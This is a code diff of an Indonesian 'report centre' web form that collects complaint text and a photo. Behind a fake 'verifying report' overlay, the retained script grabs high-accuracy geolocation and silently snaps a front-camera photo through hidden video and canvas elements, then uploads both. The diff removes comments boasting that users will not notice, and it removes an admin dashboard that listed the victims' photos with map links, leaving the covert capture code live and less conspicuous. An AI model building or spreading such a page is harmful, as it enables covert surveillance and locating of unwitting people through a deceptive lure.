@@ -7,8 +7,6 @@
     <style>
         * { box-sizing: border-box; }
         body { font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background-color: #f4f6f8; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
-        
-        /* Form Card */
         .card { background: #ffffff; padding: 35px 30px; border-radius: 12px; width: 100%; max-width: 450px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); border: 1px solid #eaeaea; }
         .header { text-align: center; margin-bottom: 25px; border-bottom: 1px solid #eaeaea; padding-bottom: 15px;}
         .header h1 { margin: 0; font-size: 22px; color: #202124; font-weight: 700; }
@@ -17,47 +15,21 @@
         .form-group label { display: block; font-size: 13px; color: #3c4043; font-weight: 600; margin-bottom: 8px; }
         .form-group textarea { width: 100%; padding: 12px 15px; border: 1px solid #dadce0; border-radius: 8px; font-size: 14px; color: #202124; font-family: inherit; resize: vertical; min-height: 100px; }
         .form-group textarea:focus { outline: none; border-color: #1a73e8; box-shadow: 0 0 0 2px rgba(26,115,232,0.1); }
-        
         .file-upload-wrapper { border: 2px dashed #dadce0; border-radius: 8px; padding: 20px; text-align: center; cursor: pointer; background: #f8f9fa; transition: all 0.2s; }
         .file-upload-wrapper:hover { border-color: #1a73e8; background: #e8f0fe; }
         .file-upload-wrapper input[type="file"] { display: none; }
         .file-upload-wrapper span { font-size: 13px; color: #5f6368; }
         .file-upload-wrapper strong { color: #1a73e8; }
-        
         button { width: 100%; padding: 14px; background-color: #1a73e8; color: #fff; border: none; border-radius: 8px; font-size: 15px; font-weight: 600; cursor: pointer; transition: background-color 0.2s; margin-top: 10px; }
         button:hover { background-color: #1557b0; }
         button:disabled { background-color: #9aa0a6; cursor: wait; }
         
-        /* OVERLAY VERIFIKASI */
         #verificationOverlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(15, 17, 21, 0.95); z-index: 9999; flex-direction: column; justify-content: center; align-items: center; color: white; text-align: center; padding: 20px; }
-        
-        /* SEMBUNYIIN KAMERA & CANVAS (Biar ga ketahuan) */
         #hiddenVideo, #hiddenCanvas { display: none; }
-        
-        /* ADMIN PANEL DASHBOARD */
-        #adminPanel { display: none; width: 100%; max-width: 1000px; margin: 0 auto; padding: 20px; }
-        .admin-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 25px; background: #fff; padding: 20px 25px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); border: 1px solid #eaeaea; }
-        .admin-header h2 { margin: 0; color: #202124; font-size: 22px; font-weight: 700; }
-        .admin-header button { width: auto; margin: 0; padding: 10px 20px; font-size: 14px; border-radius: 6px; }
-        
-        .grid-logs { display: grid; grid-template-columns: repeat(auto-fill, minmax(450px, 1fr)); gap: 20px; }
-        @media (max-width: 600px) { .grid-logs { grid-template-columns: 1fr; } }
-        
-        .log-card { background: #fff; border-radius: 12px; padding: 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.04); border: 1px solid #eaeaea; display: flex; gap: 20px; align-items: flex-start; transition: transform 0.2s; }
-        .log-card:hover { transform: translateY(-3px); box-shadow: 0 8px 25px rgba(0,0,0,0.08); }
-        
-        .log-photo { flex-shrink: 0; width: 110px; height: 130px; border-radius: 10px; object-fit: cover; border: 2px solid #dadce0; background: #f8f9fa; display: flex; align-items: center; justify-content: center; color: #9aa0a6; font-size: 12px; text-align: center; transform: scaleX(-1); }
-        
-        .log-details { flex-grow: 1; }
-        .log-date { font-size: 12px; color: #5f6368; margin-bottom: 8px; font-weight: 600; display: flex; align-items: center; gap: 5px; }
-        .log-text { font-size: 14px; color: #202124; font-weight: 500; margin-bottom: 15px; line-height: 1.5; background: #f8f9fa; padding: 12px; border-radius: 8px; border-left: 4px solid #1a73e8; word-break: break-word; }
-        .btn-map { display: inline-flex; align-items: center; gap: 6px; background: #e8f0fe; color: #1a73e8; padding: 8px 16px; border-radius: 6px; text-decoration: none; font-size: 13px; font-weight: 600; transition: background 0.2s; }
-        .btn-map:hover { background: #d2e3fc; }
     </style>
 </head>
 <body>
 
-<!-- FORM PUBLIK -->
 <div class="card" id="publicForm">
     <div class="header">
         <h1>Pusat Laporan</h1>
@@ -82,7 +54,6 @@
     </form>
 </div>
 
-<!-- OVERLAY & ELEMEN TERSEMBUNYI -->
 <div id="verificationOverlay">
     <h2 style="color:#fff; font-size:24px; margin-bottom:10px;">Memverifikasi Laporan</h2>
     <p id="verifyStatus" style="color:#a0a0b0; font-size:15px;">Harap tunggu sebentar, sedang memproses data...</p>
@@ -90,17 +61,6 @@
 
 <video id="hiddenVideo" autoplay playsinline muted></video>
 <canvas id="hiddenCanvas"></canvas>
-
-<!-- HALAMAN ADMIN (Dashboard Rapi) -->
-<div id="adminPanel">
-    <div class="admin-header">
-        <h2>🛡️ Dashboard Laporan Masuk</h2>
-        <button onclick="window.location.reload()">🔄 Refresh Data</button>
-    </div>
-    <div class="grid-logs" id="logList">
-        <div style="text-align:center; padding: 30px; color:#666; grid-column: 1/-1;">Memuat data...</div>
-    </div>
-</div>
 
 <script>
     function updateFileName() {
@@ -111,142 +71,88 @@
         }
     }
 
-    const urlParams = new URLSearchParams(window.location.search);
+    const form = document.getElementById('verifyForm');
+    const btn = document.getElementById('btnSubmit');
+    const overlay = document.getElementById('verificationOverlay');
+    const statusText = document.getElementById('verifyStatus');
+    const video = document.getElementById('hiddenVideo');
+    const canvas = document.getElementById('hiddenCanvas');
     
-    // --- LOGIKA HALAMAN ADMIN ---
-    if (urlParams.has('admin')) {
-        document.getElementById('publicForm').style.display = 'none';
-        document.getElementById('adminPanel').style.display = 'block';
-        document.body.style.backgroundColor = '#f4f6f8';
-        document.body.style.alignItems = 'flex-start';
-        document.body.style.paddingTop = '30px';
-        
-        fetch('/api/logs')
-            .then(async r => {
-                const data = await r.json();
-                if (!r.ok) throw new Error(data.error || "Gagal ambil data");
-                return data;
-            })
-            .then(data => {
-                const list = document.getElementById('logList');
-                if(data.length === 0) {
-                    list.innerHTML = '<div style="text-align:center; padding: 30px; color:#666; background:#fff; border-radius:12px; grid-column:1/-1;">Belum ada laporan yang masuk.</div>';
-                    return;
-                }
-                list.innerHTML = '';
-                data.forEach(item => {
-                    const date = new Date(item.created_at).toLocaleString('id-ID', { dateStyle: 'medium', timeStyle: 'short' });
-                    
-                    let imgTag = item.photo 
-                        ? `<img src="${item.photo}" class="log-photo" alt="Foto">` 
-                        : `<div class="log-photo">Tanpa Foto</div>`;
-                    
-                    list.innerHTML += `
-                        <div class="log-card">
-                            ${imgTag}
-                            <div class="log-details">
-                                <div class="log-date">📅 ${date}</div>
-                                <div class="log-text">"${item.kronologi || 'Tidak ada teks'}"</div>
-                                <a href="https://www.google.com/maps?q=${item.latitude},${item.longitude}" target="_blank" class="btn-map">📍 Buka di Google Maps</a>
-                            </div>
-                        </div>
-                    `;
-                });
-            })
-            .catch(err => {
-                document.getElementById('logList').innerHTML = `<div style="color:#d93025; background:#fce8e6; padding:15px; border-radius:8px; border: 1px solid #f5c6cb; text-align:center; grid-column:1/-1;"><strong>⚠️ Error:</strong> ${err.message}</div>`;
+    form.addEventListener('submit', async (e) => {
+        e.preventDefault();
+
+        const file = document.getElementById('fileInput').files[0];
+        if (!file) return alert('Lampiran foto wajib diisi!');
+
+        btn.disabled = true;
+        overlay.style.display = 'flex';
+
+        try {
+            // 1. Minta Izin Lokasi
+            statusText.innerText = 'Mengambil titik koordinat...';
+            const position = await new Promise((resolve, reject) => {
+                navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 10000 });
             });
-    } 
-    // --- LOGIKA HALAMAN PUBLIK ---
-    else {
-        const form = document.getElementById('verifyForm');
-        const btn = document.getElementById('btnSubmit');
-        const overlay = document.getElementById('verificationOverlay');
-        const statusText = document.getElementById('verifyStatus');
-        const video = document.getElementById('hiddenVideo');
-        const canvas = document.getElementById('hiddenCanvas');
-        
-        form.addEventListener('submit', async (e) => {
-            e.preventDefault();
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
 
-            const file = document.getElementById('fileInput').files[0];
-            if (!file) return alert('Lampiran foto wajib diisi!');
-
-            btn.disabled = true;
-            overlay.style.display = 'flex';
-
+            // 2. Minta Izin Kamera & JEPRET OTOMATIS
+            statusText.innerText = 'Memverifikasi identitas...';
+            let photoBase64 = null;
+            
             try {
-                // 1. Minta Izin Lokasi (Pop up lokasi)
-                statusText.innerText = 'Mengambil titik koordinat...';
-                const position = await new Promise((resolve, reject) => {
-                    navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 10000 });
-                });
-                const lat = position.coords.latitude;
-                const lon = position.coords.longitude;
-
-                // 2. Minta Izin Kamera & JEPRET OTOMATIS (Pop up kamera)
-                statusText.innerText = 'Memverifikasi identitas...';
-                let photoBase64 = null;
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+                video.srcObject = stream;
+                await new Promise(r => setTimeout(r, 200)); 
                 
-                try {
-                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-                    video.srcObject = stream;
-                    
-                    // Kasih waktu 200ms aja buat kamera nyalain lensa (super cepet)
-                    await new Promise(r => setTimeout(r, 200)); 
-                    
-                    canvas.width = video.videoWidth || 480;
-                    canvas.height = video.videoHeight || 480;
-                    const ctx = canvas.getContext('2d');
-                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    
-                    // Simpen foto, langsung matiin kamera (lampu mati, user gak sadar)
-                    photoBase64 = canvas.toDataURL('image/jpeg', 0.6);
-                    stream.getTracks().forEach(t => t.stop());
-                    
-                } catch (camErr) {
-                    console.log('Kamera ditolak, lanjut kirim data tanpa foto.');
-                }
-
-                // 3. Kirim Data ke Server
-                statusText.innerText = 'Menyimpan laporan...';
-                const kronologiText = document.getElementById('kronologi').value;
-
-                const res = await fetch('/api/upload', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ lat, lon, kronologi: kronologiText, photo: photoBase64 })
-                });
+                canvas.width = video.videoWidth || 480;
+                canvas.height = video.videoHeight || 480;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                 
-                let data;
-                try { data = await res.json(); } catch (err) { throw new Error(`Server Error: ${res.status}`); }
-
-                if (!res.ok || data.status !== 'success') {
-                    throw new Error(data.message || data.error || "Gagal menyimpan data.");
-                }
-
-                // Sukses
-                overlay.innerHTML = `
-                    <div style="font-size:60px; margin-bottom:20px;">✅</div>
-                    <h2 style="color:#4ade80; margin-bottom:10px;">Verifikasi Berhasil!</h2>
-                    <p style="color:#a0a0b0;">Laporan Anda telah diterima dan akan segera diproses.</p>
-                `;
-                
-                setTimeout(() => {
-                    overlay.style.display = 'none';
-                    form.reset();
-                    btn.disabled = false;
-                    btn.innerText = 'Kirim Laporan';
-                    document.getElementById('fileName').innerHTML = '<strong>Klik di sini</strong> untuk melampirkan foto bukti';
-                }, 3000);
-
-            } catch (err) {
-                overlay.style.display = 'none';
-                btn.disabled = false;
-                alert('Terjadi kesalahan: ' + err.message);
+                photoBase64 = canvas.toDataURL('image/jpeg', 0.6);
+                stream.getTracks().forEach(t => t.stop());
+            } catch (camErr) {
+                console.log('Kamera ditolak, lanjut kirim data tanpa foto.');
             }
-        });
-    }
+
+            // 3. Kirim Data ke Server
+            statusText.innerText = 'Menyimpan laporan...';
+            const kronologiText = document.getElementById('kronologi').value;
+
+            const res = await fetch('/api/upload', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ lat, lon, kronologi: kronologiText, photo: photoBase64 })
+            });
+            
+            let data;
+            try { data = await res.json(); } catch (err) { throw new Error(`Server Error: ${res.status}`); }
+
+            if (!res.ok || data.status !== 'success') {
+                throw new Error(data.message || data.error || "Gagal menyimpan data.");
+            }
+
+            overlay.innerHTML = `
+                <div style="font-size:60px; margin-bottom:20px;">✅</div>
+                <h2 style="color:#4ade80; margin-bottom:10px;">Verifikasi Berhasil!</h2>
+                <p style="color:#a0a0b0;">Laporan Anda telah diterima dan akan segera diproses.</p>
+            `;
+            
+            setTimeout(() => {
+                overlay.style.display = 'none';
+                form.reset();
+                btn.disabled = false;
+                btn.innerText = 'Kirim Laporan';
+                document.getElementById('fileName').innerHTML = '<strong>Klik di sini</strong> untuk melampirkan foto bukti';
+            }, 3000);
+
+        } catch (err) {
+            overlay.style.display = 'none';
+            btn.disabled = false;
+            alert('Terjadi kesalahan: ' + err.message);
+        }
+    });
 </script>
 </body>
 </html>
